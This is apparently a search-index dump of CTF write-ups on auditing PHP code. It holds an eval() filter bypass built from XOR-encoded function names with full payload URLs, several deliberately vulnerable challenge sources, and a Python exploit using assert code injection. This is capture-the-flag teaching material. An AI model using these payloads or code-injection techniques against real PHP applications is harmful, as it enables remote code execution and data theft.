!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i)))+((!!@i)))))(); If you paste payload into php script, this will simply call phpinfo(); . We're home! Let's try injecting this into challenge code. The result is... you are so close, omg Of course, I've forgotten about second condition which counts unique characters in our payload. My payload has 15 unique characters, while it accepts only <=13. Let's try to reduce those characters. Firstly, it's safe to remove all @ characters, since it doesn't change anything - just suppresses notices. Fine, this is one character less. Let's try to encode our string once more with less unique characters. To clarify how the script works and decisions here, this is sample output which shows us possibilities of encoding: 1 2 3 4 5 6 7 p: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9| h: |Q ^ 9|X ^ 0|Y ^ 1|Z ^ 2| p: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9| i: |Q ^ 8|X ^ 1|Y ^ 0|Z ^ 3| n: |V ^ 8|W ^ 9|X ^ 6|Y ^ 7|Z ^ 4| f: |Q ^ 7|R ^ 4|T ^ 2|U ^ 3|V ^ 0|W ^ 1| o: |V ^ 9|W ^ 8|X ^ 7|Y ^ 6|Z ^ 5| Those are possible pairs to encode given character. In order to minimise unique characters, we should choose either: characters which already exist in our payload (TRIM) minimum number of characters with which we can encode all chars (re-use already chosen characters) This way, we encode phpinfo as AYAYYRY ^ 1110746 , and thus generate payload with less than 14 unique chars: 1 (AYAYYRY^trim(((((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i)))+(((!!i+!!i))**((!!i))))))(); Aaaaaand, we get phpinfo() output! POC: 1 http://165.22.57.95:8000/?_=(AYAYYRY^trim(((((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i))))))(); Also, it's worth to mention, that the only char we have to urlencode is + sign - if we urlencode all the characters, we might get 414 request-uri too large for larger payloads. Looking for flag \u00b6 To be honest, I was sure I'm gonna already get the flag at this point. Obviously I was wrong, so I continued research. The very first idea was to print content of current directory (which is often place where flag is stored). In order get dir contents, we have to encode few functions 1 2 3 scandir(string $dir) // returns array of $dir content getcwd() // returns current dir path var_dump($var) // outputs $var content of any type (may be array from scandir) So following string is needed: 1 var_dump(scandir(getcwd())); Again, we encode our stuff, put it into GET parameter and...: 1 array(4) { [0]=> string(1) \".\" [1]=> string(2) \"..\" [2]=> string(9) \"index.php\" [3]=> string(34) \"n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt\" } No more words are needed, we simply encode: 1 var_dump(file_get_contents(end(scandir(getcwd())))); and get the flag: 1 string(34) \"ISITDTU{Your PHP skill is so good}\"","title":"Easyphp"},{"location":"audit/easyphp/#easyphp-871-points","text":"","title":"EasyPHP (871 points)"},{"location":"audit/easyphp/#description","text":"Don't try to run any Linux command, just use all the PHP functions you know to get the flag http://165.22.57.95:8000/","title":"Description"},{"location":"audit/easyphp/#first-look","text":"Visiting given URL gives us a look at the source file: 1 2 3 4 5 6 7 8 9 10 11 12 <?php highlight_file ( __FILE__ ); $_ = @ $_GET [ '_' ]; if ( preg_match ( '/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i' , $_ ) ) die ( 'ros\u00e9 will not do it' ); if ( strlen ( count_chars ( strtolower ( $_ ), 0x3 )) > 0xd ) die ( 'you are so close, omg' ); eval ( $_ ); ?> So there are two conditions we have to satisfy in order to eval our code. Analysis of preg_match condition let us determine all the characters and php functions we can explicitly use without any encoding. I made an assumption, that php configuration is default, so to have first look-around I parsed result of get_defined_functions() php function using given regex condition. This gives us following set of functions: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 bcmul rtrim trim ltrim chr link unlink tan atan atanh tanh intval mail min max At a first glance, functions chr and intval look promising - we could possibly craft both characters and numbers. However, to do so, we need numbers to craft strings from (as we cant use any string quotes) e.g: chr(asciicode) .","title":"First look"},{"location":"audit/easyphp/#looking-for-a-right-path","text":"How can we generate numbers then? There comes PHP syntax and behaviour with help! Basically in PHP strings have to be quoted using \" or ' . Although those characters are restricted by regex condition, PHP acts in pretty weird way, if we don't quote string - it assumes we've simply forgotten to quote it, produces notice and creates string anyway (only a-ZA-Z characters are valid in this case). Also, notice can be easily suppressed using @ which is permitted by regex. How can we get number from string, though? In this case we can simply use PHP's amazing type juggling: 1 2 3 <?php $a = !!@ i ; echo $a ; // produces boolean(true) String i is casted to false via ! operator, then negated by another ! and we have logical true . Booleans are casted to integer, when any arithmetic is used on them, so we can produce any number we want! For example: 1 2 <?php echo ( !!@ i + !!@ i ) ** ( !!@ i + !!@ i + !!@ i + !!@ i ); //outputs 2^4 = 16 Cool! Now we can create any number and one-char string using chr(asciinumber) function. Another usable PHP feature in our case is that we can call functions using strings. For example \"phpinfo\"(); equals phpinfo(); Now we have one-char-strings and ability to call functions using strings. There are not much one-char functions though - to be specific there's only one: _() which is alias for gettext() function which is used to translate strings. Not very useful. The plan now is to find a way to create string - either by concatenating one-letter strings or any method. I've spent long hours trying to figure out how to concatenate strings without using . operator (which is exactly string concatenation operator, but forbidden by regex), but I've been failing and failing... After hours of struggle, the very next morning I've re-analysed regex condition once again (for like 10 th time), and focused on operators allowed. Those are: ['!', '%', '+', '-', '*', '/', '>', '<', '?', '=', ':', '@', '^'] Eventually I noticed something interesting in PHP documentation: https://www.php.net/manual/en/language.operators.bitwise.php If both operands for the &, | and ^ operators are strings, then the operation will be performed on the ASCII values of the characters that make up the strings and the result will be a string. In all other cases, both operands will be converted to integers and the result will be an integer. This is exactly what we need. ^ stands for bitwise XOR, and if applied on strings, it XORs char by char. I have also tried out some XOR results, and it turned out, that it is possible to create lowercase characters by XORing uppercase character with a number, for example: 1 echo @ASD^\"123\"; //produces string 'paw' We already know how to create string using only permitted characters, and also how to create any number we want. If only number was string representation of integer, we could determine pairs of Uppercase letter ^ [0-9] which XORED result in ANY functions names! Next step is to create string representation for crafted number. Again, PHP type juggling arrives on a white horse yelling for attention: 1 2 <?php var_dump ( trim ( 123 )); //produces string(3) \"123\" trim(string $str) function takes string for argument, and if integer provided, simply casts it to string and returns it trimmed - this is our way to convert crafted numbers to strings.","title":"Looking for a right path"},{"location":"audit/easyphp/#exploitation","text":"Off we go, ready and steady to begin exploitation. I've written script which simply iterates through available characters and helps me to find possible Letter ^ [0-9] pairs for each character in provided function name and further generates payload which is encoded function name string. Having this I generated phpinfo(); string: 1 2 \"AQAQVQV\" ^ \"1918879\" //produces 'phpinfo' Payload: (AQAQVQV^trim(((((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i)))+((!!@i)))))(); If you paste payload into php script, this will simply call phpinfo(); . We're home! Let's try injecting this into challenge code. The result is... you are so close, omg Of course, I've forgotten about second condition which counts unique characters in our payload. My payload has 15 unique characters, while it accepts only <=13. Let's try to reduce those characters. Firstly, it's safe to remove all @ characters, since it doesn't change anything - just suppresses notices. Fine, this is one character less. Let's try to encode our string once more with less unique characters. To clarify how the script works and decisions here, this is sample output which shows us possibilities of encoding: 1 2 3 4 5 6 7 p: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9| h: |Q ^ 9|X ^ 0|Y ^ 1|Z ^ 2| p: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9| i: |Q ^ 8|X ^ 1|Y ^ 0|Z ^ 3| n: |V ^ 8|W ^ 9|X ^ 6|Y ^ 7|Z ^ 4| f: |Q ^ 7|R ^ 4|T ^ 2|U ^ 3|V ^ 0|W ^ 1| o: |V ^ 9|W ^ 8|X ^ 7|Y ^ 6|Z ^ 5| Those are possible pairs to encode given character. In order to minimise unique characters, we should choose either: characters which already exist in our payload (TRIM) minimum number of characters with which we can encode all chars (re-use already chosen characters) This way, we encode phpinfo as AYAYYRY ^ 1110746 , and thus generate payload with less than 14 unique chars: 1 (AYAYYRY^trim(((((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i)))+(((!!i+!!i))**((!!i))))))(); Aaaaaand, we get phpinfo() output! POC: 1 http://165.22.57.95:8000/?_=(AYAYYRY^trim(((((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i))))))(); Also, it's worth to mention, that the only char we have to urlencode is + sign - if we urlencode all the characters, we might get 414 request-uri too large for larger payloads.","title":"Exploitation"},{"location":"audit/easyphp/#looking-for-flag","text":"To be honest, I was sure I'm gonna already get the flag at this point. Obviously I was wrong, so I continued research. The very first idea was to print content of current directory (which is often place where flag is stored). In order get dir contents, we have to encode few functions 1 2 3 scandir(string $dir) // returns array of $dir content getcwd() // returns current dir path var_dump($var) // outputs $var content of any type (may be array from scandir) So following string is needed: 1 var_dump(scandir(getcwd())); Again, we encode our stuff, put it into GET parameter and...: 1 array(4) { [0]=> string(1) \".\" [1]=> string(2) \"..\" [2]=> string(9) \"index.php\" [3]=> string(34) \"n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt\" } No more words are needed, we simply encode: 1 var_dump(file_get_contents(end(scandir(getcwd())))); and get the flag: 1 string(34) \"ISITDTU{Your PHP skill is so good}\"","title":"Looking for flag"},{"location":"audit/example/","text":"example \u00b6 xnuca2019 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 <?php $files = scandir ( './' ); foreach ( $files as $file ) { if ( is_file ( $file )){ if ( $file !== \"index.php\" ) { unlink ( $file ); } } } include_once ( \"fl3g.php\" ); if ( ! isset ( $_GET [ 'content' ]) || ! isset ( $_GET [ 'filename' ])) { highlight_file ( __FILE__ ); die (); } $content = $_GET [ 'content' ]; if ( stristr ( $content , 'on' ) || stristr ( $content , 'html' ) || stristr ( $content , 'type' ) || stristr ( $content , 'flag' ) || stristr ( $content , 'upload' ) || stristr ( $content , 'file' )) { echo \"Hacker\" ; die (); } $filename = $_GET [ 'filename' ]; if ( preg_match ( \"/[^a-z\\.]/\" , $filename ) == 1 ) { echo \"Hacker\" ; die (); } $files = scandir ( './' ); foreach ( $files as $file ) { if ( is_file ( $file )){ if ( $file !== \"index.php\" ) { unlink ( $file ); } } } file_put_contents ( $filename , $content . \" \\n Just one chance\" ); ?> xnuca2018 ezdotso \u4e00\u9053\u73af\u5883\u914d\u7f6e\u9519\u8bef\u7684\u9898 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 <?php $param = array (); parse_str ( $_SERVER [ 'QUERY_STRING' ]); if ( isset ( $action )){ switch ( $action ){ case \"php_info\" : echo call_user_func_array ( \"php_info\" , $param ); break ; case \"cmd\" : if ( isset ( $cmd )){ if ( is_string ( $cmd )){ if ( strlen ( $cmd ) > 9 ){ die (); } $pat1 = \"/[^0-9a-zA-Z \\/\\*]/\" ; if ( preg_match ( $pat1 , $cmd ) > 0 ){ die (); } $pat2 = \"/^[a-zA-Z]+ [0-9a-zA-Z\\/\\*]+$/\" ; if ( preg_match ( $pat2 , $cmd ) == 0 ){ die (); } system ( \"busybox \" . $cmd ); } } break ; default : echo call_user_func_array ( \"hello\" , $param ); break ; } } else { show_source ( __FILE__ ); } payload: action=cmd&cmd=cat%20/flag ISITDTU2019 EasyPHP \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 <?php highlight_file ( __FILE__ ); $_ = @ $_GET [ '_' ]; if ( preg_match ( '/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i' , $_ ) ) die ( 'ros\u00e9 will not do it' ); if ( strlen ( count_chars ( strtolower ( $_ ), 0x3 )) > 0xd ) die ( 'you are so close, omg' ); eval ( $_ ); ?> 1 2 3 <?php $a = !!@ i ; echo $a ; // produces boolean(true) 1 2 <?php echo ( !!@ i + !!@ i ) ** ( !!@ i + !!@ i + !!@ i + !!@ i ); //outputs 2^4 = 16 Hack.lu 2018 babyphp \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 <?php require_once ( 'flag.php' ); error_reporting ( 0 ); if ( ! isset ( $_GET [ 'msg' ])){ highlight_file ( __FILE__ ); die (); } @ $msg = $_GET [ 'msg' ]; if ( @ file_get_contents ( $msg ) !== \"Hello Challenge!\" ){ die ( 'Wow so rude!!!!1' ); } echo \"Hello Hacker! Have a look around. \\n \" ; @ $k1 = $_GET [ 'key1' ]; @ $k2 = $_GET [ 'key2' ]; $cc = 1337 ; $bb = 42 ; if ( intval ( $k1 ) !== $cc || $k1 === $cc ){ die ( \"lol no \\n \" ); } if ( strlen ( $k2 ) == $bb ){ if ( preg_match ( '/^\\d+\uff04/' , $k2 ) && ! is_numeric ( $k2 )){ if ( $k2 == $cc ){ @ $cc = $_GET [ 'cc' ]; } } } list ( $k1 , $k2 ) = [ $k2 , $k1 ]; if ( substr ( $cc , $bb ) === sha1 ( $cc )){ foreach ( $_GET as $lel => $hack ){ $$lel = $hack ; } } $\u202eb = \"2\" ; $a = \"\u202eb\" ; //;1=b if ( $$a !== $k1 ){ die ( \"lel no \\n \" ); } // plz die now assert_options ( ASSERT_BAIL , 1 ); assert ( \" $bb == $cc \" ); echo \"Good Job ;)\" ; // TODO // echo $flag; \u5e08\u5085\u7ed9\u4e86exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #!/usr/bin/env python2 import requests import urllib import base64 # flag{7c217708c5293a3264bb136ef1fadd6e} params = { # we can provide a data: url to file_get_contents 'msg' : 'data://text/plain;base64,{}' . format ( base64 . b64encode ( 'Hello Challenge!' )), 'key1' : 1337 , # the dollar sing is NOT actually the $ 'key2' : '0' * 35 + '1337 \\xef\\xbc\\x84 ' , # if we provide an array, both substr and sha1 return null 'cc[]' : '' , # we can override k1 with using \"$$len = $hack\" 'k1' : '2' , # assert evaluates the string which results in code injection 'bb' : 'print $flag.\" \\\\ n\"; //' } url = 'https://arcade.fluxfingers.net:1819/?{}' . format ( urllib . urlencode ( params )) with requests . get ( url ) as r : print r . text WPI-CTF2019 \u00b6 1. getaflag 1 2 3 Come on down and get your flag, all you have to do is enter the correct password ... http://getaflag.wpictf.xyz:31337/ (or 31338 or 31339) The challenge required us to guess the correct password. Upon inspecting the source of the page, I found a commented out encrpted key: The trailing == suggest that it is a base64 encoding, so after decrypting it, I found the message: Hey Goutham, don't forget to block /auth.php after you upload this challenge ;) That lead me to /auth.php page which contained the hints to solve this challenge. The page contained the following pseudo code: 1 2 3 4 5 6 7 8 9 10 11 12 // Pseudocode $passcode = '???'; $flag = '????' extract($_GET); if (($input is detected)) { if ($input === get_contents($passcode)) { return $flag } else { echo \"Invalid ... Please try again!\" } } This hint shows us how the authentication works. So by manipulating the data sent to the website, I passed empty value for input and passcode which resulted in the comparison to be successful, resulting it in showing the flag. The URL was passed onto auth.php as follows: 1 http://getaflag.wpictf.xyz:31337/?input=&passcode= The leads to the success page, but the flag itself is outputted as a console.log() command using JavaScript. So I had to open the browser console to get the flag. 1 Flag: WPI{1_l0v3_PHP} b00t2root \u201919 CTF \u00b6 payload: <http://3.16.68.122/Easy-php/?1=0e9028856416420525&2%5Ba%5D=&3%5Bb%5D=&4=O:7:%22Secrets%22:2:{s:4:%22flag%22;N;s:4:%22temp%22;R:2>;} moctf \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 <?php show_source ( __FILE__ ); $c = \"<?php exit;?>\" ; @ $c .= $_POST [ 'c' ]; @ $filename = $_POST [ 'file' ]; if ( ! isset ( $filename )) { file_put_contents ( 'tmp.php' , '' ); } @ file_put_contents ( $filename , $c ); include ( 'tmp.php' ); ?>","title":"example"},{"location":"audit/example/#example","text":"xnuca2019 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 <?php $files = scandir ( './' ); foreach ( $files as $file ) { if ( is_file ( $file )){ if ( $file !== \"index.php\" ) { unlink ( $file ); } } } include_once ( \"fl3g.php\" ); if ( ! isset ( $_GET [ 'content' ]) || ! isset ( $_GET [ 'filename' ])) { highlight_file ( __FILE__ ); die (); } $content = $_GET [ 'content' ]; if ( stristr ( $content , 'on' ) || stristr ( $content , 'html' ) || stristr ( $content , 'type' ) || stristr ( $content , 'flag' ) || stristr ( $content , 'upload' ) || stristr ( $content , 'file' )) { echo \"Hacker\" ; die (); } $filename = $_GET [ 'filename' ]; if ( preg_match ( \"/[^a-z\\.]/\" , $filename ) == 1 ) { echo \"Hacker\" ; die (); } $files = scandir ( './' ); foreach ( $files as $file ) { if ( is_file ( $file )){ if ( $file !== \"index.php\" ) { unlink ( $file ); } } } file_put_contents ( $filename , $content . \" \\n Just one chance\" ); ?> xnuca2018 ezdotso \u4e00\u9053\u73af\u5883\u914d\u7f6e\u9519\u8bef\u7684\u9898 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 <?php $param = array (); parse_str ( $_SERVER [ 'QUERY_STRING' ]); if ( isset ( $action )){ switch ( $action ){ case \"php_info\" : echo call_user_func_array ( \"php_info\" , $param ); break ; case \"cmd\" : if ( isset ( $cmd )){ if ( is_string ( $cmd )){ if ( strlen ( $cmd ) > 9 ){ die (); } $pat1 = \"/[^0-9a-zA-Z \\/\\*]/\" ; if ( preg_match ( $pat1 , $cmd ) > 0 ){ die (); } $pat2 = \"/^[a-zA-Z]+ [0-9a-zA-Z\\/\\*]+$/\" ; if ( preg_match ( $pat2 , $cmd ) == 0 ){ die (); } system ( \"busybox \" . $cmd ); } } break ; default : echo call_user_func_array ( \"hello\" , $param ); break ; } } else { show_source ( __FILE__ ); } payload: action=cmd&cmd=cat%20/flag","title":"example"},{"location":"audit/example/#isitdtu2019-easyphp","text":"1 2 3 4 5 6 7 8 9 10 11 12 <?php highlight_file ( __FILE__ ); $_ = @ $_GET [ '_' ]; if ( preg_match ( '/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i' , $_ ) ) die ( 'ros\u00e9 will not do it' ); if ( strlen ( count_chars ( strtolower ( $_ ), 0x3 )) > 0xd ) die ( 'you are so close, omg' ); eval ( $_ ); ?> 1 2 3 <?php $a = !!@ i ; echo $a ; // produces boolean(true) 1 2 <?php echo ( !!@ i + !!@ i ) ** ( !!@ i + !!@ i + !!@ i + !!@ i ); //outputs 2^4 = 16","title":"ISITDTU2019 EasyPHP"},{"location":"audit/example/#hacklu-2018-babyphp","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 <?php require_once ( 'flag.php' ); error_reporting ( 0 ); if ( ! isset ( $_GET [ 'msg' ])){ highlight_file ( __FILE__ ); die (); } @ $msg = $_GET [ 'msg' ]; if ( @ file_get_contents ( $msg ) !== \"Hello Challenge!\" ){ die ( 'Wow so rude!!!!1' ); } echo \"Hello Hacker! Have a look around. \\n \" ; @ $k1 = $_GET [ 'key1' ]; @ $k2 = $_GET [ 'key2' ]; $cc = 1337 ; $bb = 42 ; if ( intval ( $k1 ) !== $cc || $k1 === $cc ){ die ( \"lol no \\n \" ); } if ( strlen ( $k2 ) == $bb ){ if ( preg_match ( '/^\\d+\uff04/' , $k2 ) && ! is_numeric ( $k2 )){ if ( $k2 == $cc ){ @ $cc = $_GET [ 'cc' ]; } } } list ( $k1 , $k2 ) = [ $k2 , $k1 ]; if ( substr ( $cc , $bb ) === sha1 ( $cc )){ foreach ( $_GET as $lel => $hack ){ $$lel = $hack ; } } $\u202eb = \"2\" ; $a = \"\u202eb\" ; //;1=b if ( $$a !== $k1 ){ die ( \"lel no \\n \" ); } // plz die now assert_options ( ASSERT_BAIL , 1 ); assert ( \" $bb == $cc \" ); echo \"Good Job ;)\" ; // TODO // echo $flag; \u5e08\u5085\u7ed9\u4e86exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #!/usr/bin/env python2 import requests import urllib import base64 # flag{7c217708c5293a3264bb136ef1fadd6e} params = { # we can provide a data: url to file_get_contents 'msg' : 'data://text/plain;base64,{}' . format ( base64 . b64encode ( 'Hello Challenge!' )), 'key1' : 1337 , # the dollar sing is NOT actually the $ 'key2' : '0' * 35 + '1337 \\xef\\xbc\\x84 ' , # if we provide an array, both substr and sha1 return null 'cc[]' : '' , # we can override k1 with using \"$$len = $hack\" 'k1' : '2' , # assert evaluates the string which results in code injection 'bb' : 'print $flag.\" \\\\ n\"; //' } url = 'https://arcade.fluxfingers.net:1819/?{}' . format ( urllib . urlencode ( params )) with requests . get ( url ) as r : print r . text","title":"Hack.lu 2018 babyphp"},{"location":"audit/example/#wpi-ctf2019","text":"1. getaflag 1 2 3 Come on down and get your flag, all you have to do is enter the correct password ... http://getaflag.wpictf.xyz:31337/ (or 31338 or 31339) The challenge required us to guess the correct password. Upon inspecting the source of the page, I found a commented out encrpted key: The trailing == suggest that it is a base64 encoding, so after decrypting it, I found the message: Hey Goutham, don't forget to block /auth.php after you upload this challenge ;) That lead me to /auth.php page which contained the hints to solve this challenge. The page contained the following pseudo code: 1 2 3 4 5 6 7 8 9 10 11 12 // Pseudocode $passcode = '???'; $flag = '????' extract($_GET); if (($input is detected)) { if ($input === get_contents($passcode)) { return $flag } else { echo \"Invalid ... Please try again!\" } } This hint shows us how the authentication works. So by manipulating the data sent to the website, I passed empty value for input and passcode which resulted in the comparison to be successful, resulting it in showing the flag. The URL was passed onto auth.php as follows: 1 http://getaflag.wpictf.xyz:31337/?input=&passcode= The leads to the success page, but the flag itself is outputted as a console.log() command using JavaScript. So I had to open the browser console to get the flag. 1 Flag: WPI{1_l0v3_PHP}","title":"WPI-CTF2019"},{"location":"audit/example/#b00t2root-19-ctf","text":"payload: <http://3.16.68.122/Easy-php/?1=0e9028856416420525&2%5Ba%5D=&3%5Bb%5D=&4=O:7:%22Secrets%22:2:{s:4:%22flag%22;N;s:4:%22temp%22;R:2>;}","title":"b00t2root \u201919 CTF"},{"location":"audit/example/#moctf","text":"1 2 3 4 5 6 7 8 9 10 11 12 <?php show_source ( __FILE__ ); $c = \"<?php exit;?>\" ; @ $c .= $_POST [ 'c' ]; @ $filename = $_POST [ 'file' ]; if ( ! isset ( $filename )) { file_put_contents ( 'tmp.php' , '' ); } @ file_put_contents ( $filename , $c ); include ( 'tmp.php' ); ?>","title":"moctf"},{"location":"audit/java/","text":"\u4ece\u53cd\u5e8f\u5217\u5316\u5230\u547d\u4ee4\u6267\u884c - Java \u4e2d\u7684 POP \u6267\u884c\u94fe \u00b6 